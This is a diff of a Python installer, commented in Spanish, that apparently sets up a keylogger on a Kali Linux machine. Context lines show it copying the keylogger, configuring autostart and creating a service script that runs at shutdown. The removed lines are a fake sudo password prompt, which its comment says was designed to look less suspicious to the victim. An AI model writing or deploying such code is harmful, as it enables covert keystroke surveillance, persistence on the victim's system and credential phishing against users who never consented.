@@ -23,11 +23,6 @@ def check_admin():
         print("Este script requiere privilegios de administrador. Por favor, ejecútelo con sudo.")
         exit(1)
 
-# Simula la solicitud de contraseña de administrador (muestra un mensaje similar al de sudo). Esta parte puede ser omitida ya que no es estrictamente necesaria. De hecho será menos sospechoso ya que está especificamente hecho para un usuario kali.
-def get_admin_password():
-    password = getpass.getpass(prompt="Sorry, try again.\n[sudo] password for kali: ")
-    return password
-
 # Función que crea el script que se ejecutará por parte del servicio que crearemos después.
 def create_shutdown_script():
     script_apagado = '''
@@ -323,7 +318,6 @@ if check_flag():
     exit(0)  # Sale del script si ya está instalado
 
 check_admin()  # Verifica que el usuario tenga permisos de administrador
-admin_password = get_admin_password()  # Pide contraseña de administrador (simulada)
 copy_keylogger()  # Copia el keylogger al sistema
 setup_autostart()  # Configura el arranque automático
 create_flag()  # Crea la bandera de instalación
